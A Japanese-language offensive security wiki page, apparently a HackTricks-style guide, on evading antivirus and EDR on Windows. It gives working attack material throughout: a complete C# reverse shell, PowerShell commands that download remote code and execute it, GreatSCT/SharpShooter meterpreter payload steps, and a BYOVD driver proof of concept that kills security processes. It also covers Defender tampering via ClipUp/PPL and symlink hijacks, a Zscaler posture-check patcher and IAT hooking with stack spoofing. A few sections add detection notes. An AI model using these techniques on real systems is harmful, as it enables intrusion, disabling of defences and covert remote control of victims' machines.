AMSI が無効化（bypass）されるのと同様に、ユーザ空間プロセスの **`EtwEventWrite`** 関数を、イベントを何も記録せずに即座に return させることも可能です。これは関数をメモリ上で patch して即座に return させることで実現し、そのプロセスに対する ETW ロギングを事実上無効化します。

より詳しい情報は **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** を参照してください。


## C# Assembly Reflection

C# binaries をメモリ内で読み込む手法はかなり以前から知られており、AV に検知されずに post-exploitation tools を実行する非常に有効な方法であり続けています。

payload は disk に触れずに直接メモリへロードされるため、プロセス全体に対する AMSI の patch だけを気にすればよいです。

多くの C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) は、C# assemblies を直接メモリ内で実行する機能をすでに提供していますが、その方法にはいくつかあります:

- **Fork\&Run**

これは **新しい sacrificial process を起動し**、その新しいプロセスに post-exploitation の悪意ある code を inject し、code を実行し、終わったら新しいプロセスを kill する手法です。これには利点と欠点の両方があります。Fork and run method の利点は、実行が Beacon implant process の **外部** で行われることです。つまり、post-exploitation の処理で何か問題が起きたり検知されたりしても、**implant が生き残る可能性が非常に高くなります。** 欠点は、**Behavioural Detections** に検知される **可能性が高くなる** ことです。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

post-exploitation の悪意ある code を **自身のプロセス内に** inject する方法です。これにより、新しいプロセスを作成して AV にスキャンされるのを避けられますが、欠点として、payload の実行に失敗した場合はクラッシュしてしまうため、**beacon を失う可能性が非常に高く** なります。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly loading についてさらに読みたい場合は、この記事 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) と InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) を確認してください。

C# Assemblies は **PowerShell から** も読み込めます。 [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) と [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) を確認してください。

## Using Other Programming Languages

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) で提案されているように、攻撃者が制御する SMB share 上にインストールされた interpreter environment へ侵害されたマシンからアクセスさせることで、他の言語を使って悪意ある code を実行することが可能です。

SMB share 上の Interpreter Binaries と環境へのアクセスを許可すれば、侵害されたマシンのメモリ内で **これらの言語による任意の code を実行** できます。

repo には、Defender は依然として scripts を scan するが、Go、Java、PHP などを利用することで **static signatures を bypass する柔軟性がより高い** と書かれています。これらの言語で obfuscation していないランダムな reverse shell scripts を試したところ、成功が確認されています。

## TokenStomping

Token stomping は、攻撃者が **access token や EDR や AV のような security prouct を manipulate する** ことを可能にする technique で、process が die しないように権限を下げつつ、malicious activities をチェックする権限を持たせないようにできます。

これを防ぐには、Windows で **外部プロセスが security process の token に対する handle を取得することを防ぐ** べきです。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

[**この blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) で説明されているように、victim の PC に Chrome Remote Desktop を導入し、それを使って takeover し、persistence を維持するのは簡単です:
1. https://remotedesktop.google.com/ からダウンロードし、「Set up via SSH」をクリックしてから、Windows 用の MSI file をクリックして MSI file をダウンロードします。
2. victim 上で installer をサイレント実行します（admin required）: `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop のページに戻って next をクリックします。すると wizard が authorize を求めるので、Authorize button をクリックして続行します。
4. 与えられた parameter を少し調整して実行します: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` （pin param により、GUI を使わずに pin を設定できます。）


## Advanced Evasion

Evasion は非常に複雑な topic で、1 つの system だけでも複数の異なる telemetry source を考慮する必要があることがあり、成熟した環境で完全に検知を回避するのはほぼ不可能です。

対峙する各 environment には、それぞれ強みと弱みがあります。

より高度な Evasion techniques を理解する足がかりとして、[@ATTL4S](https://twitter.com/DaniLJ94) のこの talk をぜひ見てください。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

これは [@mariuszbit](https://twitter.com/mariuszbit) による、Evasion in Depth についての別の素晴らしい talk でもあります。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) を使うと、binary の一部を **削除しながら**、Defender が **どの部分を malicious と判断しているかを特定** して分割してくれます。\
同じことを行う別の tool が [**avred**](https://github.com/dobin/avred) で、オープンな web サービスは [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) にあります。

### **Telnet Server**

Windows10 までは、すべての Windows に **Telnet server** が同梱されており、administrator として次の操作でインストールできました:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
システム起動時に**開始**し、今すぐ**実行**します:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnetポートを変更**（stealth）し、firewallを無効化:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)

**ON THE HOST**: _**winvnc.exe**_ を実行して server を設定する:

- _Disable TrayIcon_ オプションを有効にする
- _VNC Password_ に password を設定する
- _View-Only Password_ に password を設定する

Then, binary _**winvnc.exe**_ と **newly** 作成された **UltraVNC.ini** file を **victim** 内に移動する

#### **Reverse connection**

**attacker** は自分の **host** 上で binary `vncviewer.exe -listen 5900` を **execute inside** して、reverse **VNC connection** を受け取れるようにしておく必要がある。Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** stealth を維持するために、いくつかのことはしてはいけない

- すでに `winvnc` が running している場合は start しないこと。さもないと [popup](https://i.imgur.com/1SROTTl.png) が trigger される。`tasklist | findstr winvnc` で running しているか確認する
- 同じ directory に `UltraVNC.ini` がない状態で `winvnc` を start しないこと。そうしないと [the config window](https://i.imgur.com/rfMQWcf.png) が open する
- help のために `winvnc -h` を run しないこと。そうしないと [popup](https://i.imgur.com/oc18wcu.png) が trigger される

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT の内部:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
今すぐ `msfconsole -r file.rc` で **lister** を起動し、次で **xml payload** を **実行** します:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**現在の defender はプロセスを非常に速く終了させます。**

### 独自の reverse shell をコンパイルする

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 最初の C# Revershell

以下でコンパイルします:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Use it with:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自動ダウンロードと実行:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators list: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### ビルドインジェクターに python を使う例:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### その他のツール
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – カーネル空間から AV/EDR を殺す

Storm-2603 は、ランサムウェアを展開する前にエンドポイント保護を無効化するため、**Antivirus Terminator** として知られる小さなコンソールユーティリティを悪用した。このツールは **脆弱だが *signed* な独自ドライバ** を持ち込み、Protected-Process-Light (PPL) の AV サービスでさえブロックできない特権付き kernel 操作を実行するために悪用する。

要点
1. **Signed driver**: ディスクに配置されるファイルは `ServiceMouse.sys` だが、実体は Antiy Labs の “System In-Depth Analysis Toolkit” に含まれる正規に署名されたドライバ `AToolsKrnl64.sys` である。ドライバには有効な Microsoft の署名が付いているため、Driver-Signature-Enforcement (DSE) が有効でも読み込まれる。
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
1 行目はドライバを **kernel service** として登録し、2 行目はそれを起動して `\\.\ServiceMouse` を user land からアクセス可能にする。
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | 任意の process を PID で終了する (Defender/EDR サービスの kill に使用) |
| `0x990000D0` | ディスク上の任意の file を削除する |
| `0x990001D0` | ドライバをアンロードし、サービスを削除する |

最小限の C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD は user-mode の保護を完全に回避する。kernel で実行される code は、PPL/PP、ELAM、その他の hardening 機能に関係なく、*protected* process を開き、終了させ、または kernel object を改ざんできる。

Detection / Mitigation
•  Microsoft の vulnerable-driver block list (`HVCI`, `Smart App Control`) を有効にし、Windows が `AToolsKrnl64.sys` の読み込みを拒否するようにする。
•  新しい *kernel* service の作成を監視し、world-writable directory から driver が読み込まれた場合、または allow-list に存在しない場合は alert を出す。
•  カスタム device object に対する user-mode handle の作成に続いて、疑わしい `DeviceIoControl` 呼び出しがないか監視する。

### On-Disk Binary Patching による Zscaler Client Connector Posture Checks のバイパス

Zscaler の **Client Connector** は device-posture ルールをローカルで適用し、結果を他の component に通知するために Windows RPC に依存している。次の 2 つの弱い設計により、完全なバイパスが可能になる:

1. Posture evaluation は **完全に client-side** で行われる (boolean が server に送られるだけ)。
2. 内部 RPC endpoint は、接続してきた executable が **Zscaler によって署名されている** ことだけを検証する (`WinVerifyTrust` 経由)。

ディスク上の 4 つの signed binary を **patching** することで、両方の仕組みを無効化できる:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 常に `1` を返すので、すべての check が compliant になる |
| `ZSAService.exe` | `WinVerifyTrust` への間接 call | NOP 化 ⇒ どんな (unsigned でも) process でも RPC pipe に bind できる |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` に置換 |
| `ZSATunnel.exe` | tunnel の integrity checks | short-circuit される |

最小限の patcher 抜粋:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
元のファイルを置き換えてサービススタックを再起動した後:

* **すべての** posture checks が **green/compliant** と表示される。
* 署名されていない、または改変されたバイナリが named-pipe の RPC エンドポイント（例: `\\RPC Control\\ZSATrayManager_talk_to_me`）を開ける。
* 侵害されたホストは、Zscaler policies で定義された内部ネットワークへの無制限アクセスを得る。

この case study は、純粋にクライアント側の信頼判断と単純な署名チェックが、いくつかの byte patches で回避できることを示している。

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) は signer/level の階層を強制し、同等以上に保護されたプロセスだけが互いを tamper できるようにする。攻撃的には、PPL-enabled binary を正当に起動してその引数を制御できるなら、無害な機能（例: logging）を、AV/EDR が使用する protected directories に対する制約付きの、PPL-backed な write primitive に変えられる。

プロセスを PPL として実行させる条件
- target EXE（および読み込まれる任意の DLL）は、PPL-capable EKU で署名されている必要がある。
- プロセスは CreateProcess を使って次の flags で作成されなければならない: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`。
- binary の signer に一致する互換性のある protection level を要求する必要がある（例: anti-malware signers には `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`、Windows signers には `PROTECTION_LEVEL_WINDOWS`）。level が間違っていると作成に失敗する。

PP/PPL と LSASS protection へのより広い intro も参照:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL（protection level を選択し、target EXE に引数を渡す）:
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- 署名済みのシステムバイナリ `C:\Windows\System32\ClipUp.exe` は自己起動し、呼び出し元が指定したパスに log file を書き込むための parameter を受け付ける。
- PPL process として起動すると、ファイル書き込みは PPL backing で行われる。
- ClipUp は space を含む path を解析できない。通常は保護された場所を指すには 8.3 short paths を使う。

8.3 short path helpers
- short names を列挙する: 各親 directory で `dir /x`
- cmd で short path を導出する: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) launcher（例: CreateProcessAsPPL）を使って、PPL 対応の LOLBIN（ClipUp）を `CREATE_PROTECTED_PROCESS` 付きで起動する。
2) ClipUp の log-path argument を渡し、protected AV directory（例: Defender Platform）内で file creation を強制する。必要なら 8.3 short names を使う。
3) 対象 binary が実行中に AV によって通常は open/locked される場合（例: MsMpEng.exe）、より早く確実に実行される auto-start service を install して、boot 時に write を schedule する。Process Monitor（boot logging）で boot ordering を validate する。
4) reboot 後、PPL-backed write が AV に binary を lock される前に発生し、target file を corrupt して startup を妨げる。

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- ClipUp が書き込む内容は配置以外は制御できない。这个プリミティブは precise content injection ではなく、corruption 向け。
- service の install/start に local admin/SYSTEM が必要で、reboot window も必要。
- Timing が critical: target は open されていてはいけない。boot-time execution により file locks を回避できる。

Detections
- Boot 周辺で、通常でない arguments を付けた `ClipUp.exe` の process creation。特に non-standard launchers に親子関係づけられているもの。
- suspicious binaries を auto-start するよう設定された new services が、Defender/AV より一貫して先に起動している。Defender startup failure の前に行われた service creation/modification を調査する。
- Defender binaries/Platform directories の file integrity monitoring。protected-process flags を持つ processes による unexpected file creations/modifications。
- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` で作成された processes と、AV binary 以外による anomalous な PPL level usage を探す。

Mitigations
- WDAC/Code Integrity: どの signed binaries を PPL として実行できるか、またどの parents の下で実行できるかを制限する。legitimate contexts 以外での ClipUp invocation を block する。
- Service hygiene: auto-start services の creation/modification を restrict し、start-order manipulation を monitor する。
- Defender tamper protection と early-launch protections が有効であることを確認する。binary corruption を示す startup errors を調査する。
- 環境と互換性がある場合、security tooling を hosting する volumes で 8.3 short-name generation を disable することを検討する（十分に test すること）。

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender は次の配下の subfolders を enumerate して、実行する platform を選ぶ:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

lexicographic に最も高い version string を持つ subfolder（例: `4.18.25070.5-0`）を選択し、そこから Defender service processes を起動する（service/registry paths も更新する）。この selection は directory reparse points（symlinks）を含む directory entries を信頼する。administrator はこれを利用して Defender を attacker-writable path に redirect し、DLL sideloading または service disruption を達成できる。

Preconditions
- Local Administrator（Platform folder 配下に directories/symlinks を作成するために必要）
- reboot できる、または Defender platform の re-selection を trigger できる（boot 時の service restart）
- built-in tools のみでよい（mklink）

Why it works
- Defender は自分の folders への writes を block するが、platform selection は directory entries を信頼し、target が protected/trusted path に resolve されるかを検証せずに lexicographically highest version を選ぶ。

Step-by-step (example)
1) current platform folder の writable clone を準備する。例: `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 内にある、あなたのフォルダを指す高バージョンのディレクトリ symlink を作成する:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) トリガー選択（再起動推奨）:
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend) がリダイレクトされたパスから実行されていることを確認する:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
`C:\TMP\AV\` の下にある新しいプロセスパスと、その場所を反映するサービス設定/レジストリを確認すべきです。

Post-exploitation options
- DLL sideloading/code execution: Defender がその application directory から読み込む DLL を配置/置換して、Defender のプロセス内で code を実行する。上のセクションを参照: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink を削除して、次回起動時に設定済みパスが解決できず、Defender が起動に失敗するようにする:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> この手法自体は権限昇格を提供しないことに注意してください。管理者権限が必要です。

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams は、ランタイム evasion を C2 implant から対象モジュール自体へ移し、その Import Address Table (IAT) を hook して、選択した API を attacker-controlled な position-independent code (PIC) 経由でルーティングできます。これにより evasion は、多くの kits が公開する小さな API surface（例: CreateProcessA）を超えて一般化され、同じ保護を BOFs や post-exploitation DLLs にも拡張できます。

High-level approach
- reflective loader（prepended か companion）を使って、target module の横に PIC blob を配置します。PIC は self-contained かつ position-independent である必要があります。
- host DLL が load されると、その IMAGE_IMPORT_DESCRIPTOR を走査し、targeted imports（例: CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc）の IAT entry を、薄い PIC wrappers を指すように patch します。
- 各 PIC wrapper は、real API address に tail-call する前に evasions を実行します。典型的な evasions には次が含まれます:
- call の前後で memory を mask/unmask する（例: beacon regions を encrypt する、RWX→RX にする、page names/permissions を変更する）その後、call 後に restore する。
- Call-stack spoofing: benign な stack を構築して target API に transition し、call-stack analysis が期待される frames を解決するようにする。
- 互換性のため、Aggressor script（または同等のもの）が Beacon、BOFs、post-ex DLLs に対してどの API を hook するか登録できる interface を export します。

Why IAT hooking here
- tool code を変更したり、Beacon が特定 API を proxy するのに依存したりせずに、その hooked import を使う任意の code に対して動作します。
- post-ex DLLs をカバーします: LoadLibrary* を hook することで module load（例: System.Management.Automation.dll, clr.dll）を intercept し、それらの API calls にも同じ masking/stack evasion を適用できます。
- CreateProcessA/W をラップすることで、call-stack-based detections に対する process-spawning post-ex commands の reliable な使用を復元します。

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- リロケーション/ASLR の後、import の最初の使用の前にパッチを適用する。TitanLdr/AceLdr のような reflective loaders は、読み込まれた module の DllMain 中に hooking する例を示している。
- wrappers は小さく、PIC-safe に保つ。patching 前に取得した元の IAT value、または LdrGetProcedureAddress を使って true API を解決する。
- PIC には RW → RX transitions を使い、writable+executable pages を残さない。

Call‑stack spoofing stub
- Draugr‑style PIC stubs は fake call chain（benign modules への return addresses）を構築し、その後 real API に pivot する。
- これは、Beacon/BOFs から sensitive APIs への canonical stacks を期待する detections を回避する。
- stack cutting / stack stitching techniques と組み合わせ、API prologue の前に expected frames 内へ着地させる。

Operational integration
- reflective loader を post-ex DLLs の先頭に付け、DLL が読み込まれたときに PIC と hooks が自動で initiali ze されるようにする。
- Aggressor script を使って target APIs を登録し、Beacon と BOFs が code changes なしで同じ evasion path の恩恵を透過的に受けられるようにする。

Detection/DFIR considerations
- IAT integrity: non-image（heap/anon）addresses に解決される entries; import pointers の定期的な verification。
- Stack anomalies: loaded images に属さない return addresses; non-image PIC への abrupt transitions; 一貫しない RtlUserThreadStart ancestry。
- Loader telemetry: IAT への in-process writes、import thunks を変更する early DllMain activity、load 時に作成される unexpected RX regions。
- Image-load evasion: LoadLibrary* を hooking している場合、memory masking events と相関する automation/clr assemblies の suspicious loads を監視する。

Related building blocks and examples
- load 中に IAT patching を行う reflective loaders（例: TitanLdr, AceLdr）
- Memory masking hooks（例: simplehook）と stack-cutting PIC（stackcutting）
- PIC call-stack spoofing stubs（例: Draugr）


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

reflective loader を制御できるなら、`ProcessImports()` の **during** に import を hook できる。loader の `GetProcAddress` pointer を、hooks を先に確認する custom resolver に置き換える:

- transient loader PIC が自身を free した後も生き残る **resident PICO**（persistent PIC object）を build する。
- loader の import resolver を上書きする `setup_hooks()` function を export する（例: `funcs.GetProcAddress = _GetProcAddress`）。
- `_GetProcAddress` では ordinal imports を skip し、`__resolve_hook(ror13hash(name))` のような hash-based hook lookup を使う。hook が存在するならそれを返し、なければ real `GetProcAddress` に delegate する。
- Crystal Palace の `addhook "MODULE$Func" "hook"` entries で link time に hook targets を register する。hook は resident PICO 内にあるため有効なまま維持される。

これにより、load 後に loaded DLL の code section を patch せずに **import-time IAT redirection** が可能になる。

### 対象が PEB-walking を使う場合に hook 可能な imports を強制する

import-time hooks は、function が target の IAT に実際に存在する場合にのみ trigger される。module が PEB-walk + hash で APIs を resolve する（import entry なし）なら、loader の `ProcessImports()` path に見えるよう real import を強制する:

- hashed export resolution（例: `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`）を `&WaitForSingleObject` のような direct reference に置き換える。
- compiler が IAT entry を emit し、reflective loader が imports を resolve するときに interception が可能になる。

### Ekko-style sleep/idle obfuscation を `Sleep()` を patch せずに行う

`Sleep` を patch する代わりに、implant が使う **actual wait/IPC primitives**（`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`）を hook する。長い wait では、メモリ内 image を idle 中に encrypt する Ekko-style obfuscation chain で call を wrap する:

- `CreateTimerQueueTimer` を使って、`NtContinue` を crafted `CONTEXT` frames とともに呼ぶ callback の sequence を schedule する。
